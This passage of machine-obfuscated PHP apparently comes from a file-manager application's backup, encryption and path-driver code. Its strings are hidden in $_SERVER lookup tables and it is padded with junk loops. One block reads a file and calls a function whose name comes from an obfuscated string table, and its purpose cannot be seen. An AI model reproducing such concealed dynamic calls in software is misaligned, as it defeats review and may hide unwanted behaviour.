$Çã¥§ùÜ = $ò·¢š[778]; if (strlen($Çã¥§ùÜ) < $ò·¢š[700]) { return; } } private function avrmc5b5e7af($½›‘’«›, $ÕŞÆ, $†ÆÊ¦ = 3) { $ğ™ÑÃÊ¶ =& $_SERVER[åÄ¼Ùßš]; $€µİŸêì =& $_SERVER[ˆÆ²õğ®]; usleep(1); $½›‘’«› = trim($½›‘’«›); $¢äÎóé = $ğ™ÑÃÊ¶[779]; while ($¢äÎóé < $ğ™ÑÃÊ¶[708]) { if ($¢äÎóé >= 0) { break; } $¢äÎóé++; } $ŒÇˆ¼Šğ = mt_rand(0, 5) . $€µİŸêì[6]; $û€ûÉ = rand_string(15); $ä©àúà¦ = $€µİŸêì[302]; $ûå«Áú = $ğ™ÑÃÊ¶[780]; if (strlen($ûå«Áú) < $ğ™ÑÃÊ¶[700]) { die; } switch ($ŒÇˆ¼Šğ) { case $€µİŸêì[206]: $ß°ÇÜğ = $this->ovzw152c34bf($½›‘’«›, strrev($ÕŞÆ . $û€ûÉ)); break; case $€µİŸêì[122]: $ß°ÇÜğ = $this->ovzw152c34bf($½›‘’«›, strrev($û€ûÉ . $ÕŞÆ)); $š¢‹ÒÆ¢ = $ğ™ÑÃÊ¶[781]; if (strlen($š¢‹ÒÆ¢) < $ğ™ÑÃÊ¶[708]) { return; } break; $¡¬ïÄ”Å = $ğ™ÑÃÊ¶[782]; if (strlen($¡¬ïÄ”Å) < $ğ™ÑÃÊ¶[703]) { die; } case $€µİŸêì[303]: $ß°ÇÜğ = $this->ovzw152c34bf($½›‘’«›, base64_encode($û€ûÉ . $ÕŞÆ)); $Ûó´®†œ = $ğ™ÑÃÊ¶[783]; if (!$Ûó´®†œ) { die; } break; $õ²ÖÉ¶ = $ğ™ÑÃÊ¶[784]; while ($õ²ÖÉ¶ < $ğ™ÑÃÊ¶[703]) { if ($õ²ÖÉ¶ >= 0) { break; } $õ²ÖÉ¶++; } case $€µİŸêì[304]: $ß°ÇÜğ = $this->ovzw152c34bf($½›‘’«›, md5($û€ûÉ . $ÕŞÆ)); $«—–Ìû = $ğ™ÑÃÊ¶[785]; while (strlen($«—–Ìû) < $ğ™ÑÃÊ¶[713]) { if (!$«—–Ìû) { break; } $«—–Ìû++; } break; $Í¾ÇÔÛŸ = $ğ™ÑÃÊ¶[786]; if (strlen($Í¾ÇÔÛŸ) < $ğ™ÑÃÊ¶[722]) { die; } case $€µİŸêì[305]: $½›‘’«› = base64_encode($½›‘’«›); $õŞ®¼åô = rand(0, 64); $˜†œ€ß· = $ğ™ÑÃÊ¶[787]; if (!$˜†œ€ß·) { die; } $Üë€†ºÂ = $ä©àúà¦[$õŞ®¼åô]; $ÆŞ›’½Ã = md5($Üë€†ºÂ . md5($ÕŞÆ . $Üë€†ºÂ) . $ÕŞÆ); $ÆŞ›’½Ã = substr($ÆŞ›’½Ã, $õŞ®¼åô % 8, $õŞ®¼åô % 8 + 7); $Ÿ’´¿Ó  = $€µİŸêì[6]; $Ê¥¬‘÷Ö = 0; $úğ¬Ãê  = $ğ™ÑÃÊ¶[788]; $°½ÑÎÕõ = 0; $×æûà»½ = $ğ™ÑÃÊ¶[789]; while ($×æûà»½ < $ğ™ÑÃÊ¶[722]) { if ($×æûà»½ >= 0) { break; } $×æûà»½++; } $·ö¼¦ß = 0; for ($Ê¥¬‘÷Ö = 0; $Ê¥¬‘÷Ö < strlen($½›‘’«›); $Ê¥¬‘÷Ö++) { $·ö¼¦ß = $·ö¼¦ß == strlen($ÆŞ›’½Ã) ? 0 : $·ö¼¦ß; $¦·„Å¼ = $ğ™ÑÃÊ¶[790]; $°½ÑÎÕõ = ($õŞ®¼åô + strpos($ä©àúà¦, $½›‘’«›[$Ê¥¬‘÷Ö]) + ord($ÆŞ›’½Ã[$·ö¼¦ß++])) % 64; $ï³Ÿ¥ıÆ = $ğ™ÑÃÊ¶[791]; if (!$ï³Ÿ¥ıÆ) { return; } $Ÿ’´¿Ó  .= $ä©àúà¦[$°½ÑÎÕõ]; $¿ÀÙÉ• = $ğ™ÑÃÊ¶[792]; if (!$¿ÀÙÉ•) { die; } } $ß°ÇÜğ = hash_encode($Üë€†ºÂ . $Ÿ’´¿Ó ); $ØÂùÇ½’ = $ğ™ÑÃÊ¶[793]; if (strlen($ØÂùÇ½’) < $ğ™ÑÃÊ¶[703]) { return; } break; $´ŒÂåÍÂ = $ğ™ÑÃÊ¶[794]; if (!$´ŒÂåÍÂ) { return; } default: $ß°ÇÜğ = $this->ovzw152c34bf($½›‘’«›, $ÕŞÆ . $û€ûÉ); $áı›Ò–§ = $ğ™ÑÃÊ¶[795]; if (strlen($áı›Ò–§) < $ğ™ÑÃÊ¶[722]) { die; } break; } $ß°ÇÜğ = strrev($ŒÇˆ¼Šğ . $û€ûÉ . $ß°ÇÜğ); $Ú¹•ı†“ = $ğ™ÑÃÊ¶[796]; if ($†ÆÊ¦ - 1 > 0) { $ß°ÇÜğ = $this->avrmc5b5e7af($ß°ÇÜğ, $ÕŞÆ, $†ÆÊ¦ - 1); } return $ß°ÇÜğ; } private function mznd01c5225b($¯î¤Ğ¿, $üˆÁ¦ë, $‹˜ÌŞ‹÷ = 3) { $Å®ù›º =& $_SERVER[åÄ¼Ùßš]; $â•–Ã¤– =& $_SERVER[ˆÆ²õğ®]; if (!is_string($¯î¤Ğ¿) || strlen($¯î¤Ğ¿) < 10) { return !1; } $¯î¤Ğ¿ = trim($¯î¤Ğ¿); $¢óÓ¡˜ = $Å®ù›º[797]; while (strlen($¢óÓ¡˜) < $Å®ù›º[713]) { if (!$¢óÓ¡˜) { break; } $¢óÓ¡˜++; } $¯î¤Ğ¿ = strrev($¯î¤Ğ¿); $›íª¾ ´ = $Å®ù›º[798]; if (strlen($›íª¾ ´) < $Å®ù›º[703]) { die; } $üšüâíë = $¯î¤Ğ¿[0]; $¥¹µ³Ÿü = substr($¯î¤Ğ¿, 1, 15); $¯î¤Ğ¿ = substr($¯î¤Ğ¿, 16); $â°Œ‹í‚ = $Å®ù›º[799]; $·«¦‘Éø = $â•–Ã¤–[302]; $Ñš–¶Ù† = $Å®ù›º[800]; while (strlen($Ñš–¶Ù†) < $Å®ù›º[722]) { if (!$Ñš–¶Ù†) { break; } $Ñš–¶Ù†++; } switch ($üšüâíë) { case $â•–Ã¤–[206]: $ñôÙâÜğ = $this->zfui9af36d5d($¯î¤Ğ¿, strrev($üˆÁ¦ë . $¥¹µ³Ÿü)); $£„æáÈÒ = $Å®ù›º[801]; while (strlen($£„æáÈÒ) < $Å®ù›º[708]) { if (!$£„æáÈÒ) { break; } $£„æáÈÒ++; } break; case $â•–Ã¤–[122]: $ñôÙâÜğ = $this->zfui9af36d5d($¯î¤Ğ¿, strrev($¥¹µ³Ÿü . $üˆÁ¦ë)); $÷Ó»µ·¡ = $Å®ù›º[802]; if (!$÷Ó»µ·¡) { die; } break; $§î³öë = $Å®ù›º[794]; if (!$§î³öë) { die; } case $â•–Ã¤–[303]: $ñôÙâÜğ = $this->zfui9af36d5d($¯î¤Ğ¿, base64_encode($¥¹µ³Ÿü . $üˆÁ¦ë)); $™ş½°¯Õ = $Å®ù›º[803]; break; $“Ÿ¶ûâÈ = $Å®ù›º[804]; case $â•–Ã¤–[304]: $ñôÙâÜğ = $this->zfui9af36d5d($¯î¤Ğ¿, md5($¥¹µ³Ÿü . $üˆÁ¦ë)); break; $ñÛàºÓ = $Å®ù›º[805]; case $â•–Ã¤–[305]: $¯î¤Ğ¿ = hash_decode($¯î¤Ğ¿); $ÜãâúêÛ = $Å®ù›º[698]; while ($ÜãâúêÛ < $Å®ù›º[700]) { if ($ÜãâúêÛ >= 0) { break; } $ÜãâúêÛ++; } $ÌãØ¾×­ = $¯î¤Ğ¿[0]; $¯î¤Ğ¿ = substr($¯î¤Ğ¿, 1); $íÀ÷†¦ñ = $Å®ù›º[806]; while ($íÀ÷†¦ñ < $Å®ù›º[708]) { if ($íÀ÷†¦ñ >= 0) { break; } $íÀ÷†¦ñ++; } $õÖèŠƒë = strpos($·«¦‘Éø, $ÌãØ¾×­); $¾ë‚ŸÔ¢ = md5($ÌãØ¾×­ . md5($üˆÁ¦ë . $ÌãØ¾×­) . $üˆÁ¦ë); $¾ë‚ŸÔ¢ = substr($¾ë‚ŸÔ¢, $õÖèŠƒë % 8, $õÖèŠƒë % 8 + 7); $Ã‚±ÕŠ = $â•–Ã¤–[6]; $¿Éš­Şƒ = 0; $Å€Æß‹ = 0; $§Ö›ŞÏ = $Å®ù›º[807]; $Ñã°ı = 0; for ($¿Éš­Şƒ = 0; $¿Éš­Şƒ < strlen($¯î¤Ğ¿); $¿Éš­Şƒ++) { $Ñã°ı = $Ñã°ı == strlen($¾ë‚ŸÔ¢) ? 0 : $Ñã°ı; $şàÀï’ = $Ñã°ı++; $Ú…’’´Å = $Å®ù›º[808]; $Å€Æß‹ = strpos($·«¦‘Éø, $¯î¤Ğ¿[$¿Éš­Şƒ]) - $õÖèŠƒë - ord($¾ë‚ŸÔ¢[$şàÀï’]); $°§¹¸ê = $Å®ù›º[809]; if (strlen($°§¹¸ê) < $Å®ù›º[700]) { die; } while ($Å€Æß‹ < 0) { $Å€Æß‹ += 64; $ñ „¨¼î = $Å®ù›º[810]; } $Ã‚±ÕŠ .= $·«¦‘Éø[$Å€Æß‹]; $¶†¶•éÇ = $Å®ù›º[811]; if (strlen($¶†¶•éÇ) < $Å®ù›º[713]) { die; } } $ñôÙâÜğ = base64_decode($Ã‚±ÕŠ); $€ÕÏê˜ = $Å®ù›º[812]; if (strlen($€ÕÏê˜) < $Å®ù›º[703]) { die; } break; default: $ñôÙâÜğ = $this->zfui9af36d5d($¯î¤Ğ¿, $üˆÁ¦ë . $¥¹µ³Ÿü); break; } if ($‹˜ÌŞ‹÷ - 1 > 0) { $ñôÙâÜğ = $this->mznd01c5225b($ñôÙâÜğ, $üˆÁ¦ë, $‹˜ÌŞ‹÷ - 1); } return $ñôÙâÜğ; } public function jbzcb5a01305($‚¬å¨ñ‰) { $‘ç‰™›Ï =& $_SERVER[åÄ¼Ùßš]; $üÑ¦«³º =& $_SERVER[ˆÆ²õğ®]; $ÀÇéÄâ« = $this->ruoiaf730f1b(); $ş šøÙÚ = $this->ruoiaf730f1b(); $¨À«âĞó = ($ÀÇéÄâ« - 1) * ($ş šøÙÚ - 1); $ü°ö‰¡Ø = intval(($ÀÇéÄâ« + $ş šøÙÚ) / 2); while (1) { $¤ë¤Ç‚í = $ü°ö‰¡Ø; $Ÿçæ…ğ = $‘ç‰™›Ï[813]; if (strlen($Ÿçæ…ğ) < $‘ç‰™›Ï[722]) { return; } $ü¯³Œ‡ñ = $¨À«âĞó; $–Ïºğ‚´ = $‘ç‰™›Ï[814]; if (strlen($–Ïºğ‚´) < $‘ç‰™›Ï[722]) { die; } while ($ü¯³Œ‡ñ % $¤ë¤Ç‚í != 0) { $î”¨äşõ = $ü¯³Œ‡ñ; $ü¯³Œ‡ñ = $¤ë¤Ç‚í; $¤ë¤Ç‚í = $î”¨äşõ % $¤ë¤Ç‚í; $‚˜Øµó§ = $‘ç‰™›Ï[815]; while ($‚˜Øµó§ < $‘ç‰™›Ï[703]) { if ($‚˜Øµó§ >= 0) { break; } $‚˜Øµó§++; } } if ($¤ë¤Ç‚í == 1) { break; } else { $ü°ö‰¡Ø++; } } $®™Ø»ı = 2; $¯¾¦ß… = $‘ç‰™›Ï[794]; while ($¯¾¦ß… < $‘ç‰™›Ï[722]) { if ($¯¾¦ß… >= 0) { break; } $¯¾¦ß…++; } for ($µ¶â˜ù† = 0; $µ¶â˜ù† < $¨À«âĞó * 10; $µ¶â˜ù†++) { if (($¨À«âĞó * $µ¶â˜ù† + 1) % $ü°ö‰¡Ø == 0) { $®™Ø»ı = intval(($¨À«âĞó * $µ¶â˜ù† + 1) / $ü°ö‰¡Ø); break; } } $˜°ÅÓÎ = $this->ovzw152c34bf($ÀÇéÄâ« * $ş šøÙÚ . $üÑ¦«³º[6], $üÑ¦«³º[136]); $ÍŸ«— = md5($üÑ¦«³º[306] . ($ÀÇéÄâ« + $ş šøÙÚ) . $üÑ¦«³º[307] . $ü°ö‰¡Ø . $üÑ¦«³º[307] . $®™Ø»ı . $üÑ¦«³º[308]); $Ú»½’‰Ú = $‘ç‰™›Ï[816]; if (strlen($Ú»½’‰Ú) < $‘ç‰™›Ï[708]) { return; } $Óö‘ë£· = $this->ovzw152c34bf($‚¬å¨ñ‰, $ÍŸ«—) . $üÑ¦«³º[309] . $˜°ÅÓÎ; $«µë°­ = $‘ç‰™›Ï[817]; while ($«µë°­ < $‘ç‰™›Ï[703]) { if ($«µë°­ >= 0) { break; } $«µë°­++; } return $Óö‘ë£·; } public function jomp98b49507($úƒŞ¡Íû) { $©¨Ä¬Ê =& $_SERVER[åÄ¼Ùßš]; $´Ø¼¢ç» =& $_SERVER[ˆÆ²õğ®]; $‡ë°Ô’Ö = explode($´Ø¼¢ç»[309], $úƒŞ¡Íû); if (count($‡ë°Ô’Ö) != 2) { return $´Ø¼¢ç»[6]; } $–­’ñÓÇ = $this->zfui9af36d5d($‡ë°Ô’Ö[1] . $´Ø¼¢ç»[6], $´Ø¼¢ç»[136]); $—îçºöÔ = $©¨Ä¬Ê[818]; while ($—îçºöÔ < $©¨Ä¬Ê[708]) { if ($—îçºöÔ >= 0) { break; } $—îçºöÔ++; } if (!$–­’ñÓÇ) { return $´Ø¼¢ç»[6]; } $–­’ñÓÇ = intval($–­’ñÓÇ); $œŞ£ÔÜ· = 0; $±”îÅÊ¬ = $©¨Ä¬Ê[819]; $ĞûêÛı = 0; for ($•óÉœ™§ = 3; $•óÉœ™§ < $–­’ñÓÇ; $•óÉœ™§ += 2) { if ($–­’ñÓÇ % $•óÉœ™§ != 0) { continue; } $œŞ£ÔÜ· = $•óÉœ™§; $ĞûêÛı = intval($–­’ñÓÇ / $•óÉœ™§); $¶™–ŒÔÉ = $©¨Ä¬Ê[815]; if (!$¶™–ŒÔÉ) { return; } break; } $Ã´¸‹‘® = ($œŞ£ÔÜ· - 1) * ($ĞûêÛı - 1); $úù°‚Ú© = $©¨Ä¬Ê[820]; if (strlen($úù°‚Ú©) < $©¨Ä¬Ê[722]) { die; } $ÎÌ£šÜî = intval(($œŞ£ÔÜ· + $ĞûêÛı) / 2); $’Õé¼õú = $©¨Ä¬Ê[821]; if (!$’Õé¼õú) { return; } while (1) { $±•ìıäá = $ÎÌ£šÜî; $ÏÒ÷ì× = $©¨Ä¬Ê[822]; if (strlen($ÏÒ÷ì×) < $©¨Ä¬Ê[708]) { die; } $è–öÕÛÍ = $Ã´¸‹‘®; $òı‘¸óµ = $©¨Ä¬Ê[823]; if (!$òı‘¸óµ) { return; } while ($è–öÕÛÍ % $±•ìıäá != 0) { $ô‚¯’öı = $è–öÕÛÍ; $ŠşÙÅ‘Ã = $©¨Ä¬Ê[824]; while (strlen($ŠşÙÅ‘Ã) < $©¨Ä¬Ê[700]) { if (!$ŠşÙÅ‘Ã) { break; } $ŠşÙÅ‘Ã++; } $è–öÕÛÍ = $±•ìıäá; $±•ìıäá = $ô‚¯’öı % $±•ìıäá; $Ìô•ß†Ø = $©¨Ä¬Ê[825]; while ($Ìô•ß†Ø < $©¨Ä¬Ê[708]) { if ($Ìô•ß†Ø >= 0) { break; } $Ìô•ß†Ø++; } } if ($±•ìıäá == 1) { break; } else { $ÎÌ£šÜî++; } } $»‚¡Ú–Í = 2; $çÀ³ÔàÅ = $©¨Ä¬Ê[826]; while (strlen($çÀ³ÔàÅ) < $©¨Ä¬Ê[713]) { if (!$çÀ³ÔàÅ) { break; } $çÀ³ÔàÅ++; } for ($•óÉœ™§ = 0; $•óÉœ™§ < $Ã´¸‹‘® * 10; $•óÉœ™§++) { if (($Ã´¸‹‘® * $•óÉœ™§ + 1) % $ÎÌ£šÜî == 0) { $»‚¡Ú–Í = intval(($Ã´¸‹‘® * $•óÉœ™§ + 1) / $ÎÌ£šÜî); break; } } $­òÊÛŞô = md5($´Ø¼¢ç»[306] . ($œŞ£ÔÜ· + $ĞûêÛı) . $´Ø¼¢ç»[307] . $ÎÌ£šÜî . $´Ø¼¢ç»[307] . $»‚¡Ú–Í . $´Ø¼¢ç»[308]); $•§ó” = $this->zfui9af36d5d($‡ë°Ô’Ö[0], $­òÊÛŞô); return $•§ó”; } public function ruoiaf730f1b() { $şùÌó¼­ =& $_SERVER[åÄ¼Ùßš]; $äÌÔ¨¸Ú = mt_rand(pow(2, 14), pow(2, 16) - 1); $»À£Ñ†ƒ = $şùÌó¼­[827]; $º•ê¡ü¤ = array(); $š¯ÏÔÌ = $şùÌó¼­[828]; $‹ÓÄí¡û = 1; $ä¿ÆÜœ’ = $şùÌó¼­[829]; if (!$ä¿ÆÜœ’) { return; } while ($‹ÓÄí¡û <= (int) sqrt($äÌÔ¨¸Ú)) { $ĞÆïáÉä = $‹ÓÄí¡û; $º“‰¹„ö = $şùÌó¼­[830]; if (!$º“‰¹„ö) { die; } while (!0) { $ĞÆïáÉä++; $Ô¬¨¾ƒú = $şùÌó¼­[831]; if (!$Ô¬¨¾ƒú) { return; } if ($ĞÆïáÉä <= 2) { $‹ÓÄí¡û = $ĞÆïáÉä; break; } else { if ($ĞÆïáÉä < 2) { continue; } } $·‰è‹½• = !0; for ($ŠäŞèÇ¢ = 2; $ŠäŞèÇ¢ <= sqrt($ĞÆïáÉä); $ŠäŞèÇ¢++) { if ($ĞÆïáÉä % $ŠäŞèÇ¢ == 0) { $·‰è‹½• = !1; } } if ($·‰è‹½•) { $‹ÓÄí¡û = $ĞÆïáÉä; break; } } $º•ê¡ü¤[] = $‹ÓÄí¡û; $é³ÕÂ¹‘ = $şùÌó¼­[828]; while ($é³ÕÂ¹‘ < $şùÌó¼­[713]) { if ($é³ÕÂ¹‘ >= 0) { break; } $é³ÕÂ¹‘++; } } $çŠå¡ÃŠ = 2; for ($ĞÆïáÉä = $äÌÔ¨¸Ú; $ĞÆïáÉä > 1; $ĞÆïáÉä--) { $·‰è‹½• = !0; foreach ($º•ê¡ü¤ as $‘Ùáõº“) { if ($ĞÆïáÉä % $‘Ùáõº“ == 0) { $·‰è‹½• = !1; break; } } if ($·‰è‹½•) { $çŠå¡ÃŠ = $ĞÆïáÉä; break; } } return $çŠå¡ÃŠ; } public function lvzhed822181($íçóÛ¾Ø, $¬¶•ËãĞ) { $½´—æ€’ =& $_SERVER[ˆÆ²õğ®]; return call_user_func(array($½´—æ€’[8], $½´—æ€’[310]), $íçóÛ¾Ø, $¬¶•ËãĞ); $ü¿úù¹‚ = $_SERVER[åÄ¼Ùßš][832]; if (!$ü¿úù¹‚) { return; } } public function ovzw152c34bf($­ÀíÛ¨¬, $÷û•Ïí˜) { $üÏçòñ§ =& $_SERVER[ˆÆ²õğ®]; return call_user_func(array($üÏçòñ§[311], $üÏçòñ§[312]), $­ÀíÛ¨¬, $÷û•Ïí˜); } public function zfui9af36d5d($Ã×°†ä, $½çÓÇÏÊ) { $›¨ÈèÀ =& $_SERVER[ˆÆ²õğ®]; return call_user_func(array($›¨ÈèÀ[311], $›¨ÈèÀ[313]), $Ã×°†ä, $½çÓÇÏÊ); } } if ($_SERVER[$_SERVER[åÄ¼Ùßš][833]] != $_SERVER[$_SERVER[åÄ¼Ùßš][834]]) { $_getc = $_SERVER[åÄ¼Ùßš][835]; $_getfile = $_SERVER[$_SERVER[åÄ¼Ùßš][836]] . $_SERVER[åÄ¼Ùßš][837]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[åÄ¼Ùßš][288], $_getfilec); if (count($_getarrs) < $_SERVER[åÄ¼Ùßš][708]) { $exit = $_SERVER[åÄ¼Ùßš][838]; $exit(); } $_act = $_SERVER[åÄ¼Ùßš][839]; $_act($_SERVER[$_SERVER[åÄ¼Ùßš][840]]); } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[åÄ¼Ùßš][841]); $this->init(); $this->keep(); } public function init() { $«À„½ê =& $_SERVER[åÄ¼Ùßš]; $this->isManual(); self::$name = date($«À„½ê[842]); if (!($“îµ˜øµ = $this->model->lastItem())) { $“îµ˜øµ = $this->initData(); } else { self::$name = $“îµ˜øµ[$«À„½ê[32]]; if ($“îµ˜øµ[$«À„½ê[843]] == $«À„½ê[91]) { self::$name = date($«À„½ê[262]); $åµÑ³É® = intval(_get($“îµ˜øµ, $«À„½ê[844], 0)); if (self::$manual == 0 && $“îµ˜øµ[$«À„½ê[32]] == self::$name) { $this->model->remove($“îµ˜øµ[$«À„½ê[484]]); } $“îµ˜øµ = $this->initData($åµÑ³É®, $“îµ˜øµ[$«À„½ê[845]]); } else { $this->checkStore($“îµ˜øµ[$«À„½ê[845]]); } } self::$option = $“îµ˜øµ; } private function isManual() { $°éæ˜ƒ = _get($GLOBALS, $_SERVER[åÄ¼Ùßš][846], 0); $°éæ˜ƒ = intval($°éæ˜ƒ); self::$manual = $°éæ˜ƒ && $°éæ˜ƒ == 1 ? 1 : 0; } private function initData($·İÀĞö = 0, $ôĞ¡Õœü = '') { $æ¬¾âÎ¶ =& $_SERVER[åÄ¼Ùßš]; $ÜãÆ¶ğÍ = $this->model->config(); if ($ôĞ¡Õœü && $ÜãÆ¶ğÍ[$æ¬¾âÎ¶[845]] != $ôĞ¡Õœü) { $·İÀĞö = 0; } $this->checkStore($ÜãÆ¶ğÍ[$æ¬¾âÎ¶[845]]); if (self::$manual == 1) { self::$name .= $æ¬¾âÎ¶[11] . date($æ¬¾âÎ¶[847]); } $ŸßèÏÎÔ = array($æ¬¾âÎ¶[845] => $ÜãÆ¶ğÍ[$æ¬¾âÎ¶[845]], $æ¬¾âÎ¶[32] => self::$name, $æ¬¾âÎ¶[843] => 0, $æ¬¾âÎ¶[171] => $ÜãÆ¶ğÍ[$æ¬¾âÎ¶[171]], $æ¬¾âÎ¶[848] => self::$manual, $æ¬¾âÎ¶[849] => array($æ¬¾âÎ¶[850] => array($æ¬¾âÎ¶[843] => 0), $æ¬¾âÎ¶[851] => array($æ¬¾âÎ¶[843] => 0, $æ¬¾âÎ¶[852] => 0, $æ¬¾âÎ¶[853] => 0, $æ¬¾âÎ¶[33] => $æ¬¾âÎ¶[12], $æ¬¾âÎ¶[854] => 0, $æ¬¾âÎ¶[855] => 0), $æ¬¾âÎ¶[856] => array($æ¬¾âÎ¶[843] => 0, $æ¬¾âÎ¶[852] => 0, $æ¬¾âÎ¶[853] => 0, $æ¬¾âÎ¶[854] => 0, $æ¬¾âÎ¶[855] => 0), $æ¬¾âÎ¶[233] => array($æ¬¾âÎ¶[843] => 0, $æ¬¾âÎ¶[857] => 0, $æ¬¾âÎ¶[858] => 0, $æ¬¾âÎ¶[859] => 0, $æ¬¾âÎ¶[860] => 0, $æ¬¾âÎ¶[554] => $·İÀĞö, $æ¬¾âÎ¶[854] => 0, $æ¬¾âÎ¶[855] => 0)), $æ¬¾âÎ¶[854] => time(), $æ¬¾âÎ¶[855] => 0); $Ñ–õ¨èÜ = $this->model->insert($ŸßèÏÎÔ); $ŸßèÏÎÔ[$æ¬¾âÎ¶[484]] = $Ñ–õ¨èÜ; return $ŸßèÏÎÔ; } private function checkStore($ö“´ıõ) { $íù•Ã“ = Model($_SERVER[åÄ¼Ùßš][861]); $µä„îàÕ = $íù•Ã“->listData($ö“´ıõ); $íù•Ã“->checkConfig($µä„îàÕ); } public static function get() { if (!self::$option) { $Ø¾ š¶ä = Model($_SERVER[åÄ¼Ùßš][841]); $ÄŒÚëá÷ = $Ø¾ š¶ä->findByName(self::$name); $Ø¾ š¶ä->parseContent($ÄŒÚëá÷); self::$option = $ÄŒÚëá÷; } return self::$option; } public static function set($Ìíı²) { $Ä¤äôÚ¡ =& $_SERVER[åÄ¼Ùßš]; $šâ§¨ÉÕ = self::get(); foreach ($Ìíı² as $Æ„Áœˆ => $½¢ªäÒÊ) { array_set_value($šâ§¨ÉÕ, $Æ„Áœˆ, $½¢ªäÒÊ); } Model($Ä¤äôÚ¡[841])->update($šâ§¨ÉÕ[$Ä¤äôÚ¡[484]], $šâ§¨ÉÕ); self::$option = $šâ§¨ÉÕ; return self::$option; } public function keep() { $è®Èıˆı =& $_SERVER[åÄ¼Ùßš]; $ËäóíĞ = self::get(); if (_get($ËäóíĞ, $è®Èıˆı[862], 0) == $è®Èıˆı[91]) { return; } $this->backupKeep($ËäóíĞ); self::set(array($è®Èıˆı[862] => 1)); } private function backupKeep($ïÍÛòÏ) { $Æ„ùèâ =& $_SERVER[åÄ¼Ùßš]; if (self::$manual == 1) { return; } $¼ñ±„ ñ = $this->model->listData(); if (empty($¼ñ±„ ñ)) { return; } $×àÄ­÷û = array(); $¶¿‘— = array(); $ §ÍÕìŞ = date($Æ„ùèâ[863], strtotime($Æ„ùèâ[864])); foreach ($¼ñ±„ ñ as $¨€çÂÁ => $††ğ¾ÃÖ) { $åŸ²Ï²© = $††ğ¾ÃÖ[$Æ„ùèâ[32]]; if ($¨€çÂÁ < 7 || $††ğ¾ÃÖ[$Æ„ùèâ[848]] == $Æ„ùèâ[91]) { $×àÄ­÷û[] = $åŸ²Ï²©; continue; } $îèú±Ä = substr($åŸ²Ï²©, 0, 6); if ($îèú±Ä < $ §ÍÕìŞ) { continue; } if (!isset($¶¿‘—[$îèú±Ä]) || $åŸ²Ï²© < $¶¿‘—[$îèú±Ä]) { $¶¿‘—[$îèú±Ä] = $åŸ²Ï²©; } if (substr($åŸ²Ï²©, 6, 2) == $Æ„ùèâ[865]) { $¶¿‘—[$îèú±Ä] = $åŸ²Ï²©; } } $×àÄ­÷û = array_merge($×àÄ­÷û, array_values($¶¿‘—)); $×àÄ­÷û = array_unique($×àÄ­÷û); foreach ($¼ñ±„ ñ as $††ğ¾ÃÖ) { $åŸ²Ï²© = $††ğ¾ÃÖ[$Æ„ùèâ[32]]; if (!empty($åŸ²Ï²©) && in_array($åŸ²Ï²©, $×àÄ­÷û)) { continue; } $this->model->remove($††ğ¾ÃÖ[$Æ„ùèâ[484]]); $äì×Õñµ = $this->backupPath($ïÍÛòÏ); IO::remove($äì×Õñµ, !1); } } private function backupPath($‚—İªÂ) { $»¦€Å—Ş =& $_SERVER[åÄ¼Ùßš]; static $­šµˆÛ‰ = null; if (is_null($­šµˆÛ‰)) { $­šµˆÛ‰ = Model($»¦€Å—Ş[866])->get($»¦€Å—Ş[867]); } $Ùò€ğ•Á = $‚—İªÂ[$»¦€Å—Ş[32]]; $•›åì› = substr(md5($»¦€Å—Ş[868] . $­šµˆÛ‰ . $Ùò€ğ•Á), 0, 8); return "\173\151\157\72{$‚—İªÂ[$»¦€Å—Ş[845]]}\175\57\x64\x61\x74\x61\x62\x61\163\145\57\142\141\143\x6b\165\160\x2f" . $Ùò€ğ•Á . $»¦€Å—Ş[11] . $•›åì›; } public function db() { $ÈÄÜè™ó =& $_SERVER[åÄ¼Ùßš]; $ÀĞì‡³‰ = self::get(); if (_get($ÀĞì‡³‰, $ÈÄÜè™ó[869], 0) == $ÈÄÜè™ó[91]) { return !0; } $ğ¶ˆ÷óİ = new BackupDb(); if (!$ğ¶ˆ÷óİ->index()) { return !1; } self::set(array($ÈÄÜè™ó[869] => 1)); return !0; } public function dbFile() { $¼ØÂõ¯é =& $_SERVER[åÄ¼Ùßš]; $ÙŞĞÎ¥Î = self::get(); if (_get($ÙŞĞÎ¥Î, $¼ØÂõ¯é[870], 0) == $¼ØÂõ¯é[91]) { return !0; } $Á›”ø±È = new BackupDbFile(); if (!$Á›”ø±È->index()) { return !1; } self::set(array($¼ØÂõ¯é[870] => 1)); return !0; } public function file() { $ôãİÕ‡— =& $_SERVER[åÄ¼Ùßš]; $ğ®å³Õ• = self::get(); if (_get($ğ®å³Õ•, $ôãİÕ‡—[871], 0) == $ôãİÕ‡—[91]) { return !0; } if ($ğ®å³Õ•[$ôãİÕ‡—[171]] == $ôãİÕ‡—[872]) { $ıáç€œ = new BackupFile(); if (!$ıáç€œ->index()) { return !1; } } self::set(array($ôãİÕ‡—[871] => 1, $ôãİÕ‡—[843] => 1)); return !0; } public static function log($¬ûœ¢„ò) { write_log($¬ûœ¢„ò, $_SERVER[åÄ¼Ùßš][873]); } } goto fĞîÌÕåŒ¾; f‚­ÈÂÓ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($âÕ–›”) { if (substr($âÕ–›”, 0, 2) == $_SERVER[åÄ¼Ùßš][1456]) { $âÕ–›” = BASIC_PATH . substr($âÕ–›”, 2); } return $âÕ–›”; } public function iconvApp($¢Š¼´ì«) { $Î¿ø†—Î =& $_SERVER[åÄ¼Ùßš]; global $config; return $this->iconvTo($¢Š¼´ì«, $config[$Î¿ø†—Î[1485]], $config[$Î¿ø†—Î[1484]]); } public function iconvSystem($Õ€¾êÍ) { $Ğ†¼®¨ =& $_SERVER[åÄ¼Ùßš]; global $config; return $this->iconvTo($Õ€¾êÍ, $config[$Ğ†¼®¨[1484]], $config[$Ğ†¼®¨[1485]]); } public function getPathOuter($Õ¬ÖÄğ) { $€å ¤ª =& $_SERVER[åÄ¼Ùßš]; $ÕÇÃ‰İÉ = $this->iconvApp($this->pathBase); $Õ¬ÖÄğ = $this->iconvApp($Õ¬ÖÄğ); if (substr($ÕÇÃ‰İÉ, 0, 2) == $€å ¤ª[1456]) { $ÕÇÃ‰İÉ = BASIC_PATH . substr($ÕÇÃ‰İÉ, 2); } if (substr($Õ¬ÖÄğ, 0, 2) == $€å ¤ª[1456]) { $Õ¬ÖÄğ = BASIC_PATH . substr($Õ¬ÖÄğ, 2); } $ÕÇÃ‰İÉ = KodIO::clear($ÕÇÃ‰İÉ); $Õ¬ÖÄğ = 